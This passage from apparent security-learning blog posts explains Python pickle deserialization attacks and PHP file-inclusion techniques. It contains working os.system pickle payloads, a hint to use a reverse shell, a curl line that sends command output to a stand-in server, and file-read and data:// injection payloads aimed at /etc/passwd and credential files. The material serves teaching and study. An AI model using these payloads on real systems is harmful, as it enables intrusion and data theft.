<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_build</span>(<span class="params">self</span>):</span><br><span class="line">    stack = self.stack</span><br><span class="line">    state = stack.pop()</span><br><span class="line">    inst = stack[-<span class="number">1</span>]</span><br><span class="line">    setstate = <span class="built_in">getattr</span>(inst, <span class="string">&quot;__setstate__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> setstate <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        setstate(state)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    slotstate = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(state, <span class="built_in">tuple</span>) <span class="keyword">and</span> <span class="built_in">len</span>(state) == <span class="number">2</span>:</span><br><span class="line">        state, slotstate = state</span><br><span class="line">    <span class="keyword">if</span> state:</span><br><span class="line">        inst_dict = inst.__dict__</span><br><span class="line">        intern = sys.intern</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> state.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(k) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">                inst_dict[intern(k)] = v</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                inst_dict[k] = v</span><br><span class="line">    <span class="keyword">if</span> slotstate:</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> slotstate.items():</span><br><span class="line">            <span class="built_in">setattr</span>(inst, k, v)</span><br><span class="line">dispatch[BUILD[<span class="number">0</span>]] = load_build</span><br></pre></td></tr></table></figure>

<p>如果<code>inst</code>拥有<code>__setstate__</code>方法，则把栈顶的<code>state</code>交给<code>__setstate__</code>方法来处理；否则就把<code>state</code>中的部分或全部内容，合并到<code>inst.__dict__ </code>里面。因此，其利用方式就是用<code>&#123;&#39;__setstate__&#39;: os.system&#125;</code>来 build 对象A，然后用<code>ls -la</code>再次进行构造，由于存在<code>__setstate__</code>方法，此时state为<code>ls -la</code>，所以成功执行<code>os.system(&#39;ls -la&#39;)</code>。</p>
<p>借助先前得到的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#x27;</span><br></pre></td></tr></table></figure>

<p>我们来对它进行一定的修改。</p>
<ul>
<li><p>对开头部分的内容进行修改，将<code>\x80\x03c__main__\nB\n)</code>改为<code>\x80\x03c__main__\nA\n&#125;(V__setstate__\ncos\nsystem\nubVls -la\nb0c__main__\nB\n)</code>，这样修改依旧是圧入了一个正常对象，得到最终的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nA\n&#125;(V__setstate__\ncos\nsystem\nubVls -la\nb0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x06X\x06\x00\x00\x00passwdX\x06\x00\x00\x00123456ub.&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>我们来测试一下 payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,pickletools</span><br><span class="line">payload = pickletools.optimize(<span class="string">b&#x27;\x80\x03c__main__\nA\n&#125;(V__setstate__\ncos\nsystem\nubVls -la\nb0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x06X\x06\x00\x00\x00passwdX\x06\x00\x00\x00123456ub.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(base64.b64encode(payload), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># gANjX19tYWluX18KQQp9KFZfX3NldHN0YXRlX18KY29zCnN5c3RlbQp1YlZscyAtbGEKYjBjX19tYWluX18KQgopgX0oWAMAAABudW1LBlgGAAAAcGFzc3dkWAYAAAAxMjM0NTZ1Yi4=</span></span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>其实</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,pickletools</span><br><span class="line">payload = pickletools.optimize(<span class="string">b&#x27;\x80\x03c__main__\nA\n&#125;(V__setstate__\ncos\nsystem\nubVls -la\nb.)&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(base64.b64encode(payload), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># gANjX19tYWluX18KQQp9KFZfX3NldHN0YXRlX18KY29zCnN5c3RlbQp1YlZscyAtbGEKYi4=</span></span><br></pre></td></tr></table></figure>

<p>也可以成功执行命令，但是会导致报错。建议<strong>将栈清空，并照抄正常的B序列化之后的字符串，压入一个正常的B对象</strong>，这也正是我一直保留后半段看似没用的代码的原因，之后不再赘述。</p>
<h5 id="操作码i"><a href="#操作码i" class="headerlink" title="操作码i"></a>操作码<code>i</code></h5><p>其对应的主要代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pop_mark</span>(<span class="params">self</span>):</span><br><span class="line">    items = self.stack</span><br><span class="line">    self.stack = self.metastack.pop()</span><br><span class="line">    self.append = self.stack.append</span><br><span class="line">    <span class="keyword">return</span> items</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_inst</span>(<span class="params">self</span>):</span><br><span class="line">        module = self.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        name = self.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        klass = self.find_class(module, name)</span><br><span class="line">        self._instantiate(klass, self.pop_mark())</span><br><span class="line">    dispatch[INST[<span class="number">0</span>]] = load_inst</span><br></pre></td></tr></table></figure>

<p>首先通过<code>find_class</code>获得方法，然后通过<code>pop_mark</code>获得参数（弹出前序栈重新赋值给当前栈，而且获取当前栈上的内容），并调用<code>_instantiate</code>函数来执行，并将执行的结果存入栈中。</p>
<p>借助先前得到的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#x27;</span><br></pre></td></tr></table></figure>

<p>我们来对它进行一定的修改。</p>
<ul>
<li><p>对开头部分的内容进行修改，将<code>\x80\x03c__main__\nB\n)</code>改成<code>\x80\x03c__main__\nA\n&#125;(Vls -laios\nsystem\n0c__main__\nB\n)</code>，这样修改依旧是圧入了一个正常对象，得到最终的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nA\n&#125;(Vls -laios\nsystem\n0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>测试一下payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,pickletools</span><br><span class="line">payload = pickletools.optimize(<span class="string">b&#x27;\x80\x03c__main__\nA\n&#125;(X\x06\x00\x00\x00ls -laios\nsystem\n0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(base64.b64encode(payload), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>发现它能够成功执行命令！剩下的只需要将<code>ls -la</code>改为反弹 shell 的命令即可。</p>
<h5 id="操作码o"><a href="#操作码o" class="headerlink" title="操作码o"></a>操作码<code>o</code></h5><p>它和<code>i</code>操作码关系密切，其对应的主要代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pop_mark</span>(<span class="params">self</span>):</span><br><span class="line">    items = self.stack</span><br><span class="line">    self.stack = self.metastack.pop()</span><br><span class="line">    self.append = self.stack.append</span><br><span class="line">    <span class="keyword">return</span> items</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_obj</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># Stack is ... markobject classobject arg1 arg2 ...</span></span><br><span class="line">        args = self.pop_mark()</span><br><span class="line">        cls = args.pop(<span class="number">0</span>)</span><br><span class="line">        self._instantiate(cls, args)</span><br><span class="line">    dispatch[OBJ[<span class="number">0</span>]] = load_obj</span><br></pre></td></tr></table></figure>

<p>借助先前得到的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#x27;</span><br></pre></td></tr></table></figure>

<p>我们来对它进行一定的修改：</p>
<ul>
<li><p>对开头部分的内容进行修改，将<code>\x80\x03c__main__\nB\n)</code>改成<code>\x80\x03c__main__\nA\n&#125;(cos\nsystem\nX\x06\x00\x00\x00ls -lao0c__main__\nB\n)</code>，这样修改依旧是圧入了一个正常对象，得到最终的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nA\n&#125;(cos\nsystem\nX\x06\x00\x00\x00ls -lao0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>测试一下payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,pickletools</span><br><span class="line">payload = pickletools.optimize(<span class="string">b&#x27;\x80\x03c__main__\nA\n&#125;(cos\nsystem\nX\x06\x00\x00\x00ls -lao0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(base64.b64encode(payload), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>发现它能够成功执行命令！剩下的只需要将<code>ls -la</code>改为反弹 shell 的命令即可。</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="其他模块的load也可以触发pickle反序列化漏洞"><a href="#其他模块的load也可以触发pickle反序列化漏洞" class="headerlink" title="其他模块的load也可以触发pickle反序列化漏洞"></a>其他模块的load也可以触发pickle反序列化漏洞</h4><p>例如：<code>numpy.load()</code>先尝试以<code>numpy</code>自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此<code>numpy.load()</code>也可以触发pickle反序列化漏洞，这就是<code>CVE-2019-6446</code>。其他的序列化库比如<code>Marshal</code>，<code>PyYAML</code>，<code>Jsonpickle</code>，<code>Shelve</code>等等的反序列化利用可参看参考文献中的第五个。</p>
<h4 id="GLOBAL指令也可以自动导入os-system"><a href="#GLOBAL指令也可以自动导入os-system" class="headerlink" title="GLOBAL指令也可以自动导入os.system"></a>GLOBAL指令也可以自动导入<code>os.system</code></h4><p>即使代码中没有<code>import os</code></p>
<p>因此，不能认为“我不在代码里面导入<code>os</code>库，pickle反序列化的时候就不能执行<code>os.system</code>”。</p>
<h4 id="即使没有回显，也可以很方便地调试恶意代码。"><a href="#即使没有回显，也可以很方便地调试恶意代码。" class="headerlink" title="即使没有回显，也可以很方便地调试恶意代码。"></a>即使没有回显，也可以很方便地调试恶意代码。</h4><p>只需要拥有一台公网服务器，执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">os.system(&#x27;curl your_server/`ls / | base64`)</span><br></pre></td></tr></table></figure>

<p>然后查询您自己的服务器日志，就能看到结果。这是因为：以 &#96; 引号包含的代码，在sh中会直接执行，返回其结果。</p>
<p>下面给出一个例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,pickletools</span><br><span class="line">payload = pickletools.optimize(<span class="string">b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVcurl vps-ip/`ls / | base64`\nb.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(base64.b64encode(payload), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><code>pickle.loads()</code>时，<code>ls /</code>的结果被base64编码后发送给服务器（红框）；我们的服务器查看日志，就可以得到命令执行结果。因此，在没有回显的时候，我们可以通过<code>curl</code>把执行结果送到我们的服务器上。</p>
<h2 id="个人想法"><a href="#个人想法" class="headerlink" title="个人想法"></a>个人想法</h2><p>个人觉得和 php 反序列化的差别：</p>
<p>php 反序列化的危险程度被限制在类与方法中，没有有危害的类或方法，php 反序列化就造不成什么危害</p>
<p>pickle 本身就是轻量级的 PVM ，一个 python 虚拟机，大白话就是 Ta 想做什么事情你还真管不了他，所以相对php 反序列化来说，python 反序列化的攻击面更广，危害性更大。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://zhuanlan.zhihu.com/p/419362785">一文带你搞懂Python中pickle模块 - 知乎 (zhihu.com)</a></p>
<p><a href="https://christa.top/details/8/">Python 序列化漏洞学习(上) - christa’s blog</a></p>
<p><a href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0G0=it0Q6qGNnmjYQuqcD9GOYD&alichlgref=https://xz.aliyun.com/t/7436#toc-11">pickle反序列化初探 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含学习记录</title>
    <url>/2024/03/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="认识是文件包含："><a href="#认识是文件包含：" class="headerlink" title="认识是文件包含："></a>认识是文件包含：</h2><p>通过<code>PHP</code>函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。</p>
<span id="more"></span>

<h3 id="文件包含的环境要求："><a href="#文件包含的环境要求：" class="headerlink" title="文件包含的环境要求："></a>文件包含的环境要求：</h3><ul>
<li><code>allow_url_fopen=On</code>(默认为<code>On</code>) 规定是否允许从远程服务器或者网站检索数据</li>
<li><code>allow_url_include=On</code>(<code>php5.2</code>之后默认为<code>Off</code>) 规定是否允许include&#x2F;require远程文件</li>
</ul>
<h3 id="常见文件包含函数："><a href="#常见文件包含函数：" class="headerlink" title="常见文件包含函数："></a>常见文件包含函数：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>() <span class="comment">//执行到include时才包含文件，找不到文件只生成警告（E_WARNING），并且脚本会继续 </span></span><br><span class="line"><span class="keyword">require</span>() <span class="comment">//程序运行就包含文件，找不到文件会生成致命错误（E_COMPILE_ERROR）并停止脚本 </span></span><br><span class="line"><span class="keyword">include_once</span>() </span><br><span class="line"><span class="keyword">require_once</span>() </span><br><span class="line"><span class="comment">//和前面注解一样，_once()后缀表明只会包含一次，已包含则不会再包含</span></span><br></pre></td></tr></table></figure>

<h3 id="文件包含特性："><a href="#文件包含特性：" class="headerlink" title="文件包含特性："></a>文件包含特性：</h3><p>只要被包含的文件的文件内容符合PHP语法，不管文件类型是什么，该文件都会被PHP解释器去解析执行；如果文件内容不符合PHP语法，就会将该文件内容读取出来。</p>
<h2 id="文件包含利用"><a href="#文件包含利用" class="headerlink" title="文件包含利用"></a>文件包含利用</h2><h3 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h3><p>直接读取</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//example.com/file.php?file=f&#x27;l.txt</span></span><br></pre></td></tr></table></figure>

<p>file协议读取</p>
<p>本地文件传输协议，用于访问本地计算机中的文件。好比通过Windows的资源管理器中打开文件或者通过右键单击<code>打开</code>一样。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//example.com/file.php?file=file:///etc/passwd</span></span><br></pre></td></tr></table></figure>

<p>注意：向<code>include()</code>函数传递参数的名字不一定为<code>file</code></p>
<h4 id="常见敏感文件"><a href="#常见敏感文件" class="headerlink" title="常见敏感文件"></a>常见敏感文件</h4><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><table>
<thead>
<tr>
<th align="center">文件</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">C:\boot.ini</td>
<td align="center">查看系统版本</td>
</tr>
<tr>
<td align="center">C:\windows\system32\inetsrv\MetaBase.xml</td>
<td align="center">iis配置文件</td>
</tr>
<tr>
<td align="center">C:\windows\repair\same</td>
<td align="center">存储windows系统初次安装密码</td>
</tr>
<tr>
<td align="center">C:\ProgramFiles\mysql\my.ini</td>
<td align="center">mysql配置信息</td>
</tr>
<tr>
<td align="center">C:\ProgramFiles\mysql\data\mysql\user.MYD</td>
<td align="center">mysql root密码</td>
</tr>
<tr>
<td align="center">C:\windows\win.ini</td>
<td align="center">系统信息，常用于注入木马</td>
</tr>
</tbody></table>
<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><table>
<thead>
<tr>
<th align="center">文件</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&#x2F;etc&#x2F;passwd</td>
<td align="center">账户信息</td>
</tr>
<tr>
<td align="center">&#x2F;etc&#x2F;shadow</td>
<td align="center">账户密码文件</td>
</tr>
<tr>
<td align="center">&#x2F;etc&#x2F;apache2&#x2F;apache2.conf</td>
<td align="center">Apache2默认配置文件</td>
</tr>
<tr>
<td align="center">&#x2F;etc&#x2F;my.conf</td>
<td align="center">mysql配置文件</td>
</tr>
<tr>
<td align="center">&#x2F;etc&#x2F;php&#x2F;5.6&#x2F;apache2&#x2F;php.ini</td>
<td align="center">mysql配置文件</td>
</tr>
<tr>
<td align="center">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</td>
<td align="center">apache配置信息</td>
</tr>
</tbody></table>
<h3 id="数据流封装器"><a href="#数据流封装器" class="headerlink" title="数据流封装器"></a>数据流封装器</h3><p>data协议用于传输数据，经常配合<code>file_get_contents()</code>函数使用。</p>
<p>data协议用于传输数据，经常配合<code>file_get_contents()</code>函数使用。 </p>
<p>使用条件： </p>
<p>php版本大于等于5.2.0 </p>
<p>php.ini中<code>allow_url_fopen=On</code>，<code>all_url_include=On</code></p>
<p>用法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//,＜文本数据＞</span></span><br><span class="line">data:<span class="comment">//text/plain,＜文本数据＞</span></span><br><span class="line">data:<span class="comment">//text/html,＜HTML代码＞ </span></span><br><span class="line">data:<span class="comment">//text/html;base64,＜base64编码的HTML代码＞     </span></span><br><span class="line">data:<span class="comment">//text/css,＜CSS代码＞ </span></span><br><span class="line">data:<span class="comment">//text/css;base64,＜base64编码的CSS代码＞ </span></span><br><span class="line">data:<span class="comment">//text/javascript,＜Javascript代码＞ </span></span><br><span class="line">data:<span class="comment">//text/javascript;base64,＜base64编码的Javascript代码＞ </span></span><br><span class="line">data:<span class="comment">//image/gif;base64,base64编码的gif图片数据 </span></span><br><span class="line">data:<span class="comment">//image/png;base64,base64编码的png图片数据 </span></span><br><span class="line">data:<span class="comment">//image/jpeg;base64,base64编码的jpeg图片数据 </span></span><br><span class="line">data:<span class="comment">//image/x-icon;base64,base64编码的icon图片数据</span></span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain,&lt;?php phpinfo();?&gt;</span></span><br><span class="line">?file=data:<span class="comment">//text/plain,%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e</span></span><br><span class="line"><span class="comment"># url编码</span></span><br><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span></span><br><span class="line"><span class="comment"># &lt;?php phpinfo();?&gt;</span></span><br><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span></span><br><span class="line"><span class="comment"># &lt;?php phpinfo();</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;?php phpinfo();?&gt;</code>编成base64的时候出现了<code>+</code>。而浏览器不认识<code>+</code>，所以一般不加<code>?&gt;</code></p>
<h3 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h3><h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><p>在进行 php 代码审计时，需要查看目标的源代码。但是利用文件包含漏洞直接包含 php 文件时会被解析，不能看到源码，这时可以用 <code>php://filter</code> 来读取源代码文件。</p>
<h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><h5 id="直接读写"><a href="#直接读写" class="headerlink" title="直接读写"></a>直接读写</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=filepath</span></span><br></pre></td></tr></table></figure>

<h5 id="过滤器的基本使用"><a href="#过滤器的基本使用" class="headerlink" title="过滤器的基本使用"></a>过滤器的基本使用</h5><h6 id="base64-的编码与解码"><a href="#base64-的编码与解码" class="headerlink" title="base64 的编码与解码"></a>base64 的编码与解码</h6><p><code>convert.base64-encode</code> 与 <code>convert.base64-decode</code> 是 <code>php://filter</code> 所支持的过滤器，使用这两个过滤器等同于使用 <code>base64_encode()</code> 与 <code>base64_decode()</code> 对数据流进行处理。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=filepath</span></span><br><span class="line">php:<span class="comment">//filter/convert.base64-decode/resource=filepath</span></span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 省略 write=</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/convert.base64-encode/resource=./file.txt&#x27;</span>, <span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 base64 编码后的内容</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/resource=./file.txt&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 convert.base64-decode 过滤器数据流进行 base64 解码操作</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=convert.base64-decode/resource=./file.txt&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;SGVsbG8gV29ybGQ=&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;Hello World&quot;</span></span><br><span class="line">PHP Warning:  <span class="title function_ invoke__">file_get_contents</span>(): Unable to locate filter <span class="string">&quot;resource=.&quot;</span> in C:\demo.php on line <span class="number">8</span></span><br><span class="line">PHP Warning:  <span class="title function_ invoke__">file_get_contents</span>(): Unable to create <span class="title function_ invoke__">filter</span> (resource=.) in C:\demo.php on line <span class="number">8</span></span><br><span class="line">PHP Warning:  <span class="title function_ invoke__">file_get_contents</span>(): Unable to locate filter <span class="string">&quot;file.txt&quot;</span> in C:\demo.php on line <span class="number">8</span></span><br><span class="line">PHP Warning:  <span class="title function_ invoke__">file_get_contents</span>(): Unable to create <span class="title function_ invoke__">filter</span> (file.txt) in C:\demo.php on line <span class="number">8</span></span><br></pre></td></tr></table></figure>

<h6 id="rot13-加密与解密"><a href="#rot13-加密与解密" class="headerlink" title="rot13 加密与解密"></a>rot13 加密与解密</h6><p>rot13算法</p>
<p>ROT13（Rotate By 13 Places）是一种简单的字母替代密码，是凯撒密码的一种变体。其基本思想是将字母表中的每一个字母移动 <code>13</code> 个位置。因为拉丁字母表有 <code>26</code> 个字母，所以 <code>ROT13 解密</code> 是其自身的 <code>逆运算</code>：即对一个已经 ROT13 加密的文本再次进行 ROT13 加密，将获得加密文本的原始文本。</p>
<p><img src="https://s2.loli.net/2023/11/18/K4ZT6yleCf2sxOg.png" alt="image-20231026093556600"></p>
<p>这种加密方法的主要优点是它的简单性和对称性，但显然，<code>ROT13</code> 不提供真正的安全性，因为它很容易破解。事实上，ROT13 经常在在线社区中用作一种简单的方式来 <strong>隐藏剧透、答案或轻微的冒犯内容，而不是用作真正的加密手段</strong>。</p>
<p>string.rot13</p>
<p>通过 <code>php://filter</code> 使用 <code>string.rot13</code> 过滤器即可对数据流进行 <code>rot13</code> 处理。对此，请参考如下示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对数据流进行 ROT13 加密</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/write=string.rot13/resource=file.txt&#x27;</span>, <span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取数据但不对数据流应用任何过滤器</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;php://filter/resource=./file.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对数据流进行 ROT13 加密以获取其原文</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=string.rot13/resource=file.txt&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Uryyb Jbeyq</span><br><span class="line"><span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;Hello World&quot;</span></span><br><span class="line">PHP Warning:  <span class="keyword">include</span>(): Unable to locate filter <span class="string">&quot;resource=.&quot;</span> in C:\demo.php on line <span class="number">8</span></span><br><span class="line">PHP Warning:  <span class="keyword">include</span>(): Unable to create <span class="title function_ invoke__">filter</span> (resource=.) in C:\demo.php on line <span class="number">8</span></span><br><span class="line">PHP Warning:  <span class="keyword">include</span>(): Unable to locate filter <span class="string">&quot;file.txt&quot;</span> in C:\demo.php on line <span class="number">8</span></span><br><span class="line">PHP Warning:  <span class="keyword">include</span>(): Unable to create <span class="title function_ invoke__">filter</span> (file.txt) in C:\demo.php on line <span class="number">8</span></span><br></pre></td></tr></table></figure>

<h5 id="过滤器列表"><a href="#过滤器列表" class="headerlink" title="过滤器列表"></a>过滤器列表</h5><h6 id="多个过滤器的使用"><a href="#多个过滤器的使用" class="headerlink" title="多个过滤器的使用"></a>多个过滤器的使用</h6><p>在为 <code>php://filter</code> 指定过滤器时，可以通过 <code>管道符 |</code> 指定多个过滤器（过滤器列表），这些过滤器将按照 <strong>从左至右</strong>的顺序 <strong>依次</strong> 对数据流进行处理。对此，请参考如下示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 依次对数据流进行 base64 编码处理，rot13 处理。</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/convert.base64-encode|string.rot13/resource=file.txt&#x27;</span>, <span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对 file.txt 文件中的内容进行普通读取</span></span><br><span class="line"><span class="variable">$raw_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./file.txt&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$raw_content</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于没有先将文件中的内容进行 rot13 处理，直接对其进行解码将无法恢复原数据内容。</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$raw_content</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># 先对文件中的内容进行 rot13 处理，再对处理结果进行 base64 解码</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/string.rot13|convert.base64-decode/resource=./file.txt&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$content</span>);</span><br><span class="line"></span><br><span 